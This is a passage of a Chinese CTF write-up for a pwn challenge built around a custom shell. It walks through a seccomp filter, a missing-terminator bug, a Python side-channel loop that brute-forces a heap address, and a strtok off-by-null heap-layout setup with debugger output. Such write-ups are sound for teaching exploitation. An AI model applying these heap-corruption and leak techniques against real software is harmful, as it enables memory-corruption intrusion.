class="keyword">goto</span> <span class="number">0016</span></span><br><span class="line"> <span class="number">0013</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000030</span>  A = fd <span class="meta"># mmap(addr, len, prot, flags, fd, pgoff)</span></span><br><span class="line"> <span class="number">0014</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0016</span></span><br><span class="line"> <span class="number">0015</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0016</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br><span class="line"> <span class="number">0017</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0018</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x0000000b</span>  <span class="keyword">if</span> (A != munmap) <span class="keyword">goto</span> <span class="number">0020</span></span><br><span class="line"> <span class="number">0019</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0020</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0021</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x0000000c</span>  <span class="keyword">if</span> (A != brk) <span class="keyword">goto</span> <span class="number">0023</span></span><br><span class="line"> <span class="number">0022</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0023</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0024</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x00000027</span>  <span class="keyword">if</span> (A != getpid) <span class="keyword">goto</span> <span class="number">0026</span></span><br><span class="line"> <span class="number">0025</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0026</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0027</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x00000066</span>  <span class="keyword">if</span> (A != getuid) <span class="keyword">goto</span> <span class="number">0029</span></span><br><span class="line"> <span class="number">0028</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0029</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0030</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x00000068</span>  <span class="keyword">if</span> (A != getgid) <span class="keyword">goto</span> <span class="number">0032</span></span><br><span class="line"> <span class="number">0031</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0032</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0033</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x04</span> <span class="number">0x00000014</span>  <span class="keyword">if</span> (A != writev) <span class="keyword">goto</span> <span class="number">0038</span></span><br><span class="line"> <span class="number">0034</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000010</span>  A = fd <span class="meta"># writev(fd, vec, vlen)</span></span><br><span class="line"> <span class="number">0035</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A != <span class="number">0x1</span>) <span class="keyword">goto</span> <span class="number">0037</span></span><br><span class="line"> <span class="number">0036</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0037</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br><span class="line"> <span class="number">0038</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0039</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x05</span> <span class="number">0x0000003c</span>  <span class="keyword">if</span> (A != <span class="built_in">exit</span>) <span class="keyword">goto</span> <span class="number">0045</span></span><br><span class="line"> <span class="number">0040</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000010</span>  A = error_code <span class="meta"># exit(error_code)</span></span><br><span class="line"> <span class="number">0041</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == <span class="number">0x0</span>) <span class="keyword">goto</span> <span class="number">0043</span></span><br><span class="line"> <span class="number">0042</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A != <span class="number">0x1</span>) <span class="keyword">goto</span> <span class="number">0044</span></span><br><span class="line"> <span class="number">0043</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0044</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br><span class="line"> <span class="number">0045</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0046</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x05</span> <span class="number">0x000000e7</span>  <span class="keyword">if</span> (A != exit_group) <span class="keyword">goto</span> <span class="number">0052</span></span><br><span class="line"> <span class="number">0047</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000010</span>  A = error_code # exit_group(error_code)</span><br><span class="line"> <span class="number">0048</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == <span class="number">0x0</span>) <span class="keyword">goto</span> <span class="number">0050</span></span><br><span class="line"> <span class="number">0049</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A != <span class="number">0x1</span>) <span class="keyword">goto</span> <span class="number">0051</span></span><br><span class="line"> <span class="number">0050</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0051</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br><span class="line"> <span class="number">0052</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0053</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x03</span> <span class="number">0x00000127</span>  <span class="keyword">if</span> (A != preadv) <span class="keyword">goto</span> <span class="number">0057</span></span><br><span class="line"> <span class="number">0054</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000010</span>  A = fd <span class="meta"># preadv(fd, vec, vlen, pos_l, pos_h)</span></span><br><span class="line"> <span class="number">0055</span>: <span class="number">0x25</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A &lt;= <span class="number">0x2</span>) <span class="keyword">goto</span> <span class="number">0057</span></span><br><span class="line"> <span class="number">0056</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0057</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>
<ul>
<li><code>read</code> 的 FD 必须为“0”</li>
</ul>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">√ rtfm</span><br><span class="line">πππππππππππππππππππππππππππππππππππππππππππππππππππππππππππππππππ</span><br><span class="line">π	rtfm.			Read This Friendly Manual	π <span class="comment">// 菜单</span></span><br><span class="line">π	qq.				Quit Quietly			π <span class="comment">// 退出</span></span><br><span class="line">π	lol,[-l].		List Of fiLes			π <span class="comment">// 显示文件</span></span><br><span class="line">π	rip.[FILE]		Redirect InPut			π <span class="comment">// 重定向输入</span></span><br><span class="line">π	nsfw,FILE,PERM.		New Single File <span class="keyword">for</span> Writing	π <span class="comment">// 用于写入的新单个文件</span></span><br><span class="line">π	wtf,DATA,FILE.		Write data To File		π <span class="comment">// 将数据写入文件</span></span><br><span class="line">π	omfg,FILE.		Output My File Gracefully	π <span class="comment">// 输出我的文件</span></span><br><span class="line">π	gtfo,FILE.		GeT the File Out		π <span class="comment">// 将文件删除</span></span><br><span class="line">π	ouo.			Output current User Out		π <span class="comment">// 输出当前用户</span></span><br><span class="line">π	stfu,USER.		SeT <span class="keyword">new</span> Friendly User		π <span class="comment">// 设置新用户</span></span><br><span class="line">π	asap,[USER].		ASsign A <span class="keyword">new</span> Password		π <span class="comment">// 设置新密码</span></span><br><span class="line">π	sus,USER.		Switch USer			π <span class="comment">// 切换用户</span></span><br><span class="line">π	shit.			SHell InformaTion		π <span class="comment">// shell信息</span></span><br><span class="line">π	irl.			Instantly Reset shelL		π <span class="comment">// 即时重置shell</span></span><br><span class="line">πππππππππππππππππππππππππππππππππππππππππππππππππππππππππππππππππ</span><br></pre></td></tr></table></figure>
<ul>
<li>程序提供了一个菜单，提供了这些功能</li>
</ul>
<p>比赛时根本找不到洞，只是发现有些不严谨的地方：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_pw</span><span class="params">(<span class="keyword">char</span> *dest)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> read_num = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (read_num &lt; PWMAX) &#123;</span><br><span class="line">        <span class="keyword">int</span> res = read(STDIN_FILENO, &amp;dest[read_num], <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (res &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">terminate</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (dest[read_num] == <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">            dest[read_num] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">            <span class="keyword">return</span> read_num;</span><br><span class="line">        &#125;</span><br><span class="line">        read_num++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> read_num;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这里的 <code>read</code> 最多只能读取 0x40 字节的数据</li>
<li>如果把这 0x40 字节的数据读满，就会导致字符串最后的 “\x00” 被覆盖，从而导致 <code>ushadow[PWMAX]</code> 和 <code>uname</code> 连起来：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user</span> &#123;</span></span><br><span class="line">    <span class="keyword">char</span> ushadow[PWMAX];</span><br><span class="line">    <span class="keyword">char</span> *uname;</span><br><span class="line">    <span class="keyword">int</span> uid;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>由于程序不会输出 <code>ushadow[PWMAX]</code>，我也就找不到泄露的办法了，直到比赛最后也没有进展了</li>
</ul>
<p><strong>侧信道攻击</strong></p>
<p>关于侧信道攻击，我之前在复现 SCTF 的 Gadget 时用过一次，用于爆破存储于内存中的 “flag”</p>
<p>网上有位师傅采用了侧信道攻击的方法来泄露存放于 <code>user-&gt;uname</code> 的堆地址，我仔细思考了一下，发现本题目确实有侧信道攻击的条件：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">chk_pw</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *pw)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> input;</span><br><span class="line">    <span class="keyword">int</span> pw_len = <span class="built_in">strlen</span>(pw);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pw_len + <span class="number">1</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> res = read(STDIN_FILENO, &amp;input, <span class="number">1</span>); </span><br><span class="line">        <span class="keyword">if</span> (res &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">terminate</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (i == pw_len) &#123; <span class="comment">// The last character must be a line break</span></span><br><span class="line">            <span class="keyword">return</span> input == <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="string">&#x27;\n&#x27;</span>) &#123; <span class="comment">// Ignore accidental line breaks</span></span><br><span class="line">            i--;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/* If password mismatch, quit immediately */</span></span><br><span class="line">        <span class="keyword">if</span> (input != pw[i]) &#123;</span><br><span class="line">            <span class="comment">/* Read characters until &#x27;\n&#x27; */</span></span><br><span class="line">            <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">int</span> res = read(STDIN_FILENO, &amp;input, <span class="number">1</span>); </span><br><span class="line">                <span class="keyword">if</span> (res &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="built_in">terminate</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (input == <span class="string">&#x27;\n&#x27;</span>) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>程序有一个功能是检查 <code>user-&gt;ushadow[PWMAX]</code> 是否和输出值匹配，这里 <code>read</code> 读入的字符数并不是固定的 “0x40”，而是 <code>strlen(pw)</code></li>
<li>而之前我们已经把 <code>user-&gt;ushadow[PWMAX]</code> 末尾的 “\x00” 给去除掉了，因此这个 <code>read</code> 将会读取超过 “0x40” 大小的数据</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!chk_pw(gusers[i]-&gt;ushadow)) &#123;</span><br><span class="line">    <span class="comment">/* Clear data when error occurs */</span></span><br><span class="line">    bzero(gusers[i]-&gt;ushadow, PWMAX);</span><br><span class="line">    write_str(<span class="string">&quot;asap: pw1 ≠ pw2\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>如果字符不匹配就会立刻返回，并且输出 <code>asap: pw1 ≠ pw2\n</code></li>
</ul>
<p>尝试使用侧信道攻击来泄露 <code>user-&gt;uname</code>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leakname</span>(<span class="params">username,password</span>):</span></span><br><span class="line">    heap_addr = <span class="string">&quot;\x80&quot;</span></span><br><span class="line">    try_addr = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xff</span>):</span><br><span class="line">                <span class="keyword">if</span>(j==<span class="number">0xa</span>):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                success(<span class="string">&quot;heap_addr &gt;&gt; &quot;</span> + <span class="built_in">hex</span>(u64(heap_addr.ljust(<span class="number">0x8</span>,<span class="string">&#x27;\0&#x27;</span>))))</span><br><span class="line">                try_addr = heap_addr + <span class="built_in">chr</span>(j)</span><br><span class="line">                cmd(<span class="string">&quot;asap.,?!&quot;</span>+username)</span><br><span class="line">                p.sendlineafter(<span class="string">&quot;password:&quot;</span>,password)</span><br><span class="line">                p.sendlineafter(<span class="string">&quot;retype password:&quot;</span>,password+try_addr)</span><br><span class="line">                ret = p.recvuntil(<span class="string">&quot;\n&quot;</span>,timeout=<span class="number">0.1</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">b&quot;asap: &quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> ret:</span><br><span class="line">                    heap_addr += <span class="built_in">chr</span>(j)</span><br><span class="line">                    p.sendline(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br></pre></td></tr></table></figure>
<ul>
<li>注意以下细节：<ul>
<li>爆破时把“\n”排除掉（程序对“\n”有特殊操作）</li>
<li>当字符匹配成功时，需要再输入一个“\x00”来结束当前的 <code>chk_pw</code> 函数</li>
</ul>
</li>
</ul>
<p><strong>Strtok Off-by-null</strong></p>
<p><code>strtok</code> 函数会不断往字符串后面遍历，直到遇到 “\x00” 截断，同时 <code>strtok</code> 会将查找到的隔断符 <code>delim</code> 设置为 “\x00”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">strtok</span><span class="params">(<span class="keyword">char</span> s[], <span class="keyword">const</span> <span class="keyword">char</span> *delim)</span></span>;</span><br></pre></td></tr></table></figure>
<ul>
<li><code>delim</code> 可以有多个值，单独的这些值都可以完成分割（如果出现连续的多个 <code>delim</code> 中所记录的值，则只把第一个值置为 “\x00”，然后跳过最后一个值返回指针）</li>
<li><code>strtok</code> 第一个参数为 NULL 时，继承的是上一次 <code>strtok</code> 返回的指针</li>
</ul>
<p>在源码中，可以发现 <code>delim</code> 的值如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> delim[] = <span class="string">&quot;.,?!&quot;</span>;</span><br></pre></td></tr></table></figure>
<ul>
<li>对应的 ascii 分别为：<code>0x2e 0x2c 0x3f 0x21</code></li>
</ul>
<p>注意这个 <code>0x21</code>，如果某个大 chunk 的低位也是 <code>0x21</code>，那么这最后一字节就有可能被 <code>strtok</code> 给设置为 “\x00”，这里可以实现 off-by-null</p>
<p>在 <code>init_sh</code> 中对 <code>gbuff</code> 进行了初始化，申请的大小固定为“0x400”</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Allocate global buffer */</span></span><br><span class="line">gbuff = xmalloc(GBSIZE);</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x56241b74e380</span></span><br><span class="line">Size: <span class="number">0x411</span></span><br></pre></td></tr></table></figure>
<p>而我们能够写入的最大范围为“0x400”，根本写入不了 next chunk-&gt;presize</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read_max(gbuff, GBSIZE);</span><br></pre></td></tr></table></figure>
<p>在 <code>cmd_irl</code> 函数中提供了控制 <code>gbuff</code> 的代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xfree(gbuff);</span><br><span class="line">gbuff = xmalloc(GBSIZE);</span><br></pre></td></tr></table></figure>
<p>于是我们可以提前在一个 chunk 中写好 next chunk-&gt;presize，先释放掉它，然后想办法让 <code>xmalloc</code> 重新申请到这个 chunk</p>
<ul>
<li>本题目的 <code>xfree</code> 会自动把 target chunk 置空</li>
<li>需要利用 <code>xrealloc</code> 来释放 target chunk</li>
</ul>
<p>注意：写入 next chunk-&gt;presize 时不能写入 “\x00”，取而代之的是 “/”，程序会执行以下函数来把 “/” 转换为 “\x00”：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">remove_slash</span><span class="params">(<span class="keyword">char</span> *fname)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fname_len = <span class="built_in">strlen</span>(fname);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; fname_len; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (fname[i] == <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">            fname[i] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>使用 <code>&quot;rip.&quot;+&quot;a&quot;*(0x400-4)</code> 就可以触发</li>
</ul>
<p>测试代码如下：（这里只是演示效果，堆风水随时可以更改）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">presize = <span class="number">0xdead</span></span><br><span class="line">payload = p16(presize) + <span class="string">&quot;/&quot;</span>*<span class="number">6</span></span><br><span class="line"></span><br><span class="line">newfile(<span class="string">&quot;1&quot;</span>,<span class="number">3</span>)</span><br><span class="line">newfile(<span class="string">&quot;2&quot;</span>,<span class="number">3</span>)</span><br><span class="line">writefile(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">rip(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">rip(<span class="string">&quot;1&quot;</span>,payload+<span class="string">&quot;b&quot;</span>*<span class="number">0xf8</span>) <span class="comment"># 提前写入next chunk-&gt;presize</span></span><br><span class="line">rip(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;c&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">rip(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;d&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">rip(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;e&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">rip(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;f&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">rip(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;g&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">rip(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;h&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">rip(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;i&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">rip(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;g&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">newfile(<span class="string">&quot;3&quot;</span>,<span class="number">3</span>)</span><br><span class="line">rip(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">writefile(<span class="string">&quot;2&quot;</span>,<span class="string">&quot;c&quot;</span>*(<span class="number">0x400</span>-<span class="number">6</span>))</span><br><span class="line">writefile(<span class="string">&quot;3&quot;</span>,<span class="string">&quot;d&quot;</span>*<span class="number">0x310</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">pwndbg&gt; x/20xg 0x56532e4f2d30</span></span><br><span class="line"><span class="string">0x56532e4f2d30:	0x0000000000000000	0x0000000000000411 /* target chunk */</span></span><br><span class="line"><span class="string">0x56532e4f2d40:	0x6363636363636363	0x6363636363636363</span></span><br><span class="line"><span class="string">......</span></span><br><span class="line"><span class="string">0x56532e4f3130:	0x6363636363636363	0x6161616161006363</span></span><br><span class="line"><span class="string">0x56532e4f3140:	0x2f2f2f2f2f2fdead	0x0000000000000321 /* next chunk */</span></span><br><span class="line"><span class="string">0x56532e4f3150:	0x6464646464646464	0x6464646464646464</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<p>现在要思考的问题就是：如何申请到这个 target chunk</p>
<p>如果释放的 <code>gbuff</code> 进入了 tcache bin，那它很快就可以被申请出来（tcache bin 采用 LIFO），所以在释放 <code>gbuff</code> 前必须先将 tcache bin 填满，并且把这个 target chunk 放入 tcache bin 头部</p>
<p>接下来释放的 <code>gbuff</code> 就会进入 unsortedbin，并且申请到 target chunk</p>
